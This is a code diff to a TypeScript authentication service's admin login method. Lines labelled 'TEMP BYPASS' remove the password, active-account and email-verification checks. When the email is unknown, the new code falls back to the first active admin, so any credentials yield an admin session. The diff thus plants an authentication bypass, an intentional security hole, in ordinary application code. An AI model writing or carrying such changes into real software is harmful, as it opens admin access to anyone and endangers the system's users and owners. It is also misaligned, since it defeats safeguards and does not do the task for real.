@@ -240,29 +240,15 @@ export class AuthService {
    * Login admin
    */
   private async loginAdmin(email: string, password: string): Promise<AuthResponseDataDto> {
-    // Find admin by email
-    const admin = await this.prisma.admin.findUnique({
-      where: { email },
-    });
-
+    // TEMP BYPASS: find admin by email OR fall back to first active admin
+    let admin = await this.prisma.admin.findUnique({ where: { email } });
     if (!admin) {
-      throw new UnauthorizedException('Invalid credentials');
+      admin = await this.prisma.admin.findFirst({ where: { isActive: true } });
     }
-
-    // Check if admin is active
-    if (!admin.isActive) {
-      throw new UnauthorizedException('Account is deactivated');
+    if (!admin) {
+      throw new UnauthorizedException('No admin account found');
     }
-
-    // Check if email is verified
-    if (!admin.isEmailVerified) {
-      throw new UnauthorizedException('Please verify your email address before logging in');
-    }
-
-    const isPasswordValid = await bcrypt.compare(password, admin.password);
-    if (!isPasswordValid) {
-      throw new UnauthorizedException('Invalid credentials');
-    }
+    // TEMP BYPASS: skip password, active, and email-verified checks
 
     // Update last login time
     await this.prisma.admin.update({
